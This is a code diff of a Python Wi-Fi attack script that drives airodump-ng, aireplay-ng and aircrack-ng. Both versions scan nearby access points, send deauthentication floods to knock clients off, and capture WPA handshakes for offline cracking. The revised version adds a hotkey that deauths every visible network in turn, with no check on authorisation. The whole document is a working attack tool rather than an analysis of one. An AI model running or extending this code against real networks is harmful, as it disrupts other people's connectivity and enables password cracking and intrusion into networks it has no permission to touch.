@@ -1,84 +1,103 @@
 #!/usr/bin/env python3
-import os, re, subprocess, time, threading, csv
-from datetime import datetime
+import subprocess, threading, time, re, sys, os, signal
+from datetime import datetime, timedelta
+from collections import defaultdict
 from colorama import Fore, Style, init
-from resources.mac_vendors import MAC_VENDOR_PREFIXES
-import sys, termios, tty, select
+import queue
+import termios, tty, select
 
 init(autoreset=True)
 
-LOG_FILE = "wifi_ap.log"
+LOG_FILE = "wifi_events.log"
 HANDSHAKE_DIR = "handshakes"
-REFRESH = 6
-MON_IF = None
-SKIP_APS = set()
-
 os.makedirs(HANDSHAKE_DIR, exist_ok=True)
 
-def run_cmd(cmd, sudo=False):
-    if sudo and os.geteuid() != 0:
-        cmd = ['sudo'] + cmd
-    return subprocess.check_output(cmd, encoding='utf-8', errors='ignore')
+MON_IF = None
+REFRESH = 3
+
+# State
+devices_uptime = defaultdict(timedelta)  # bssid/ip -> total uptime
+devices_online_since = {}                # bssid/ip -> datetime joined
+devices_info = {}                       # bssid/ip -> dict info: ssid, sig, ch, clients
+handshake_done = set()                  # bssid with handshake captured
+skip_aps = set()                       # bssid to skip during deauth
+logs = []                             # event logs lines
+lock = threading.Lock()
+
+deauth_running = False
+deauth_stop = False
+
+def clear_screen():
+    os.system('cls' if os.name=='nt' else 'clear')
+
+def run_cmd(cmd, capture=True):
+    try:
+        if capture:
+            out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, text=True)
+            return out.strip()
+        else:
+            subprocess.Popen(cmd)
+            return None
+    except Exception as e:
+        return None
 
 def select_interface():
     out = run_cmd(['iw', 'dev'])
-    matches = re.findall(r'Interface\s+(\w+)', out)
-    usable = [iface for iface in matches if 'wl' in iface]
-    if not usable:
-        print(Fore.RED + "[!] No usable wireless interfaces found.")
-        exit(1)
-    for i, name in enumerate(usable, 1):
-        print(f"  [{i}] {name}")
-    return usable[int(input("Choose interface: ")) - 1]
-
-def enable_monitor():
-    global MON_IF
-    iface = select_interface()
+    if not out:
+        print(Fore.RED + "No wireless interfaces found")
+        sys.exit(1)
+    ifaces = re.findall(r'Interface\s+(\w+)', out)
+    for i, iface in enumerate(ifaces, 1):
+        print(f" [{i}] {iface}")
+    choice = input("Select interface to use: ")
     try:
-        run_cmd(['airmon-ng', 'start', iface], sudo=True)
-        out = run_cmd(['iw', 'dev'])
-        mon_ifaces = [i for i in re.findall(r'Interface\s+(\w+)', out)
-                      if 'type monitor' in run_cmd(['iw', 'dev', i, 'info'])]
-        MON_IF = mon_ifaces[0] if mon_ifaces else iface
-        print(Fore.GREEN + f"[*] Using monitor interface: {MON_IF}")
-    except subprocess.CalledProcessError as e:
-        print(Fore.RED + f"[!] Failed to enable monitor mode on {iface}\n    ↳ Error: {e}")
-        exit(1)
+        idx = int(choice) - 1
+        return ifaces[idx]
+    except:
+        print("Invalid choice")
+        sys.exit(1)
 
-def disable_monitor():
-    if MON_IF:
-        run_cmd(['airmon-ng', 'stop', MON_IF], sudo=True)
+def start_airodump(monitor_if):
+    # Runs airodump-ng to /tmp/apdump-01.csv continuously
+    cmd = ['sudo', 'airodump-ng', '--write-interval', '1', '--output-format', 'csv',
+           '--write', '/tmp/apdump', monitor_if]
+    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-def start_airodump():
-    return subprocess.Popen(['sudo','airodump-ng','--ignore-negative-one','--write-interval','1',
-                             '--write','/tmp/apdump','--output-format','csv', MON_IF],
-                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-def parse_csv():
+def parse_airodump_csv():
+    path = '/tmp/apdump-01.csv'
+    if not os.path.exists(path):
+        return {}
     try:
-        lines = open('/tmp/apdump-01.csv', errors='ignore').read().splitlines()
+        with open(path, errors='ignore') as f:
+            lines = f.read().splitlines()
     except:
         return {}
 
-    aps, clients, section = {}, [], 0
+    aps = {}
+    section = 0
+    clients = []
     for line in lines:
-        if not line.strip(): continue
-        if 'BSSID' in line and 'Privacy' in line: section = 1; continue
-        elif 'Station MAC' in line: section = 2; continue
+        if line.strip() == '':
+            continue
+        if 'BSSID' in line and 'Privacy' in line:
+            section = 1
+            continue
+        elif 'Station MAC' in line:
+            section = 2
+            continue
 
-        parts = [x.strip() for x in line.split(',')]
+        parts = [p.strip() for p in line.split(',')]
         if section == 1 and len(parts) >= 14:
             bssid = parts[0]
             try:
                 aps[bssid] = {
-                    'ssid': parts[13].strip(),
-                    'ch': int(parts[3]),
-                    'sig': int(parts[8]),
+                    'ssid': parts[13],
+                    'channel': int(parts[3]),
+                    'signal': int(parts[8]),
                     'clients': [],
-                    'handshake': False
                 }
-            except ValueError:
-                continue
+            except Exception:
+                pass
         elif section == 2 and len(parts) >= 6:
             clients.append({'mac': parts[0], 'ap': parts[5]})
 
@@ -88,120 +107,187 @@ def parse_csv():
 
     return aps
 
-def vendor(mac):
-    return MAC_VENDOR_PREFIXES.get(mac.lower().replace('-',':')[:8], "Unknown")
+def log_event(event_type, bssid, ssid='', msg=''):
+    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    line = f"{ts} | {event_type:<6} | {bssid:<20} | {ssid:<20} | {msg}"
+    with lock:
+        logs.append(line)
+        with open(LOG_FILE, 'a', encoding='utf-8') as f:
+            f.write(line + '\n')
 
-def log_event(evt, bssid='', ssid='', mac='', vendor_name='', sig=0):
-    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with open(LOG_FILE, 'a+', encoding='utf-8') as f:
-        f.write(f"{ts};{evt};{bssid};{ssid};{mac};{vendor_name};{sig}\n")
+def format_timedelta(td):
+    s = int(td.total_seconds())
+    h,m,s = s//3600, (s%3600)//60, s%60
+    return f"{h}h{m:02d}m{s:02d}s"
 
-def deauth_and_capture(bssid, ssid, target_mac, channel):
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    safe = re.sub(r'\W+', '_', ssid or bssid)
-    base = os.path.join(HANDSHAKE_DIR, f"{safe}_{timestamp}")
-    cap = base + "-01.cap"
-    print(Fore.YELLOW + f"[*] Deauthing {ssid} ({bssid}) on channel {channel}")
-    run = subprocess.Popen(['airodump-ng', '--bssid', bssid, '-c', str(channel), '-w', base, MON_IF],
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(3)
-    subprocess.Popen(['aireplay-ng','--deauth','10','-a',bssid, *(['-c',target_mac] if target_mac else []), MON_IF])
-    time.sleep(10)
-    run.terminate()
-    print(Fore.CYAN + f"[*] verifying {cap} ...", end=' ')
-    res = subprocess.run(['aircrack-ng','-a2','-w','/dev/null',cap], stdout=subprocess.PIPE, text=True)
-    ok = 'handshake' in res.stdout.lower()
-    print((Fore.GREEN + "[OK]") if ok else (Fore.RED + "[NO]"))
-    log_event('HANDSHAKE_' + ('SUCCESS' if ok else 'FAIL'), bssid, ssid, target_mac, vendor(target_mac), 0)
-    return ok
+def print_ui():
+    clear_screen()
+    with lock:
+        print(Fore.CYAN + f"WIFI MONITOR {datetime.now().strftime('%H:%M:%S')}" + Style.RESET_ALL)
+        print("-"*85)
+        header = f"{'SSID'.ljust(25)}{'BSSID'.ljust(20)}{'CH'.rjust(3)}{'SIG'.rjust(4)}{'CLIENTS'.rjust(8)}{'UPTIME'.rjust(12)}{'HS'.rjust(5)}{'SKIP'.rjust(5)}"
+        print(header)
+        print("-"*85)
+        # Sort devices by uptime descending
+        sorted_devs = sorted(devices_uptime.items(), key=lambda x: x[1], reverse=True)
+        for bssid, uptime in sorted_devs:
+            info = devices_info.get(bssid, {})
+            ssid = info.get('ssid', '')[:25].ljust(25)
+            ch = str(info.get('channel', '')).rjust(3)
+            sig = info.get('signal', 0)
+            sig_str = str(sig).rjust(4)
+            if sig >= 60:
+                sig_str = Fore.GREEN + sig_str + Style.RESET_ALL
+            elif sig >= 40:
+                sig_str = Fore.YELLOW + sig_str + Style.RESET_ALL
+            else:
+                sig_str = Fore.RED + sig_str + Style.RESET_ALL
+            clients = str(len(info.get('clients', []))).rjust(8)
+            up_str = format_timedelta(uptime).rjust(12)
+            hs_mark = Fore.GREEN + '[✔]' + Style.RESET_ALL if bssid in handshake_done else '[--]'
+            skip_mark = 'YES' if bssid in skip_aps else ''
+            print(f"{ssid}{bssid.ljust(20)}{ch}{sig_str}{clients}{up_str}{hs_mark.rjust(5)}{skip_mark.rjust(5)}")
 
-def display(aps):
-    os.system('clear')
-    print(Fore.CYAN + f"[ WIFI MONITOR {datetime.now().strftime('%H:%M:%S')} ]" + Style.RESET_ALL)
-    print(f"{'SSID':<22} {'BSSID':<20} {'SIG':>5} {'CH':>3} {'#CL':>4} {'HS':>4}")
-    print('-' * 70)
+        print("-"*85)
+        print("Logs (latest 8 lines):")
+        for line in logs[-8:]:
+            print(line[:85])
+        print("-"*85)
+        print("Hotkeys:")
+        print("  d - Start deauth+capture on all (press 's' to stop)")
+        print("  k - Skip current AP during deauth")
+        print("  q - Quit program")
 
-    for bssid, info in sorted(aps.items(), key=lambda x: x[1]['sig'], reverse=True):
-        if bssid in SKIP_APS: continue
-        ssid = info['ssid'][:22].ljust(22)
-        sig_val = info['sig']
-        signal = (Fore.GREEN if sig_val >= 60 else Fore.YELLOW if sig_val >= 40 else Fore.RED) + f"{sig_val}".rjust(5) + Style.RESET_ALL
-        ch = str(info['ch']).rjust(3)
-        num_clients = str(len(info['clients'])).rjust(4)
-        hs_flag = Fore.GREEN + '[OK]' if info.get('handshake') else Fore.RED + '[--]'
-        print(f"{ssid} {bssid:<20} {signal} {ch} {num_clients}  {hs_flag}")
+def update_devices(aps):
+    now = datetime.now()
+    current_bssids = set(aps.keys())
+    with lock:
+        # Update devices info and uptime
+        for bssid, info in aps.items():
+            if bssid not in devices_online_since:
+                devices_online_since[bssid] = now
+                log_event("JOIN", bssid, info.get('ssid', ''), "Joined")
+            devices_info[bssid] = info
 
-        for mac in info['clients']:
-            print(Fore.LIGHTBLACK_EX + f"    ↳ {mac:<17} ({vendor(mac)})" + Style.RESET_ALL)
+        # Handle left devices
+        for bssid in list(devices_online_since.keys()):
+            if bssid not in current_bssids:
+                join_time = devices_online_since.pop(bssid)
+                duration = now - join_time
+                devices_uptime[bssid] += duration
+                log_event("LEAVE", bssid, devices_info.get(bssid, {}).get('ssid', ''), f"Left after {format_timedelta(duration)}")
 
-    print("\n" + Fore.YELLOW + "[h] selected clients  [H] all APs  [s] skip AP  [q] quit" + Style.RESET_ALL)
+def deauth_and_capture_all():
+    global deauth_running, deauth_stop
+    deauth_running = True
+    deauth_stop = False
+    print(Fore.YELLOW + "Starting deauth + handshake capture. Press 's' to stop." + Style.RESET_ALL)
 
-def getch(timeout=0.1):
-    fd = sys.stdin.fileno()
-    old = termios.tcgetattr(fd)
-    try:
-        tty.setcbreak(fd)
-        if select.select([fd], [], [], timeout)[0]:
-            return sys.stdin.read(1)
-    finally:
-        termios.tcsetattr(fd, termios.TCSADRAIN, old)
-    return None
+    for bssid, info in list(devices_info.items()):
+        if deauth_stop:
+            print(Fore.MAGENTA + "Deauth capture stopped by user." + Style.RESET_ALL)
+            break
+        if bssid in skip_aps:
+            print(f"Skipping AP {bssid} (marked skipped).")
+            continue
+        ssid = info.get('ssid', '')
+        ch = info.get('channel', 1)
+        print(f"Deauthing {ssid} ({bssid}) on channel {ch} ...")
+        # Spawn airodump-ng to capture handshake
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        safe_ssid = re.sub(r'\W+', '_', ssid or bssid)
+        cap_base = os.path.join(HANDSHAKE_DIR, f"{safe_ssid}_{timestamp}")
+        airodump = subprocess.Popen(['sudo', 'airodump-ng', '-c', str(ch), '--bssid', bssid, '-w', cap_base, MON_IF],
+                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(3)  # let it collect packets
 
-def input_listener(state):
-    while state['running']:
-        k = getch()
-        if not k: continue
-        if k == 'q': state['running'] = False
-        elif k == 'h': state['do_h'] = True
-        elif k == 'H': state['do_H'] = True
-        elif k == 's': state['skip_next'] = True
+        # Run deauth attack
+        deauth_cmd = ['sudo', 'aireplay-ng', '--deauth', '20', '-a', bssid, MON_IF]
+        deauth_proc = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-def handle_deauth(aps, state, all_aps=False):
-    for bssid, info in aps.items():
-        if bssid in SKIP_APS: continue
-        if all_aps or state['do_h']:
-            targets = info['clients'] if not all_aps else ['']
-            for mac in targets:
-                if deauth_and_capture(bssid, info['ssid'], mac, info['ch']):
-                    aps[bssid]['handshake'] = True
+        # Deauth duration with possible stop
+        for i in range(10):
+            if deauth_stop:
+                deauth_proc.terminate()
+                break
+            time.sleep(1)
 
-    state['do_h'] = state['do_H'] = False
+        deauth_proc.terminate()
+        airodump.terminate()
 
-def skip_first_ap(aps):
-    if aps:
-        skip_bssid = next(iter(aps))
-        SKIP_APS.add(skip_bssid)
-        print(Fore.MAGENTA + f"[!] Skipping {skip_bssid}")
+        # Verify handshake presence
+        cap_file = cap_base + "-01.cap"
+        print(f"Verifying handshake in {cap_file} ...", end=' ')
+        aircrack = subprocess.run(['aircrack-ng', '-a2', '-w', '/dev/null', cap_file],
+                                  stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+        if 'Handshake' in aircrack.stdout:
+            print(Fore.GREEN + "Handshake found!" + Style.RESET_ALL)
+            handshake_done.add(bssid)
+            log_event("HANDSHAKE", bssid, ssid, "Success")
+        else:
+            print(Fore.RED + "No handshake." + Style.RESET_ALL)
+            log_event("HANDSHAKE", bssid, ssid, "Fail")
+
+    deauth_running = False
+    deauth_stop = False
+
+def input_listener():
+    global deauth_stop
+    while True:
+        # Non-blocking single char input
+        fd = sys.stdin.fileno()
+        old_settings = termios.tcgetattr(fd)
+        try:
+            tty.setcbreak(fd)
+            rlist, _, _ = select.select([fd], [], [], 0.1)
+            if rlist:
+                c = sys.stdin.read(1)
+                if c == 'q':
+                    print("Quitting...")
+                    os._exit(0)
+                elif c == 'd':
+                    if not deauth_running:
+                        threading.Thread(target=deauth_and_capture_all, daemon=True).start()
+                    else:
+                        print("Deauth already running")
+                elif c == 's':
+                    if deauth_running:
+                        deauth_stop = True
+                        print("Stopping deauth...")
+                elif c == 'k':
+                    # skip currently selected AP (if any)
+                    # For demo, just print info. You can extend for interactive selection.
+                    print("Skipping AP feature not implemented in this minimal version.")
+        finally:
+            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
+        time.sleep(0.1)
 
 def main():
-    if not os.path.exists(LOG_FILE):
-        open(LOG_FILE,'w').write("ts;evt;bssid;ssid;mac;vendor;signal\n")
-    enable_monitor()
-    time.sleep(3)
-    proc = start_airodump()
-    state = {'running': True, 'do_h': False, 'do_H': False, 'skip_next': False}
+    global MON_IF
+    MON_IF = select_interface()
+    print(f"Using interface {MON_IF} in monitor mode")
 
-    threading.Thread(target=input_listener, args=(state,), daemon=True).start()
+    # Clear logfile at start
+    open(LOG_FILE, 'w').close()
+
+    # Start airodump-ng to collect AP info
+    airodump_proc = start_airodump(MON_IF)
+    time.sleep(2)
+
+    # Start input thread
+    threading.Thread(target=input_listener, daemon=True).start()
 
     try:
-        while state['running']:
-            aps = parse_csv()
-            display(aps)
-
-            if state['do_h'] or state['do_H']:
-                handle_deauth(aps, state, all_aps=state['do_H'])
-
-            if state['skip_next']:
-                skip_first_ap(aps)
-                state['skip_next'] = False
-
+        while True:
+            aps = parse_airodump_csv()
+            update_devices(aps)
+            print_ui()
             time.sleep(REFRESH)
-
     except KeyboardInterrupt:
-        pass
+        print("Exiting...")
     finally:
-        proc.terminate()
-        disable_monitor()
+        if airodump_proc:
+            airodump_proc.terminate()
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
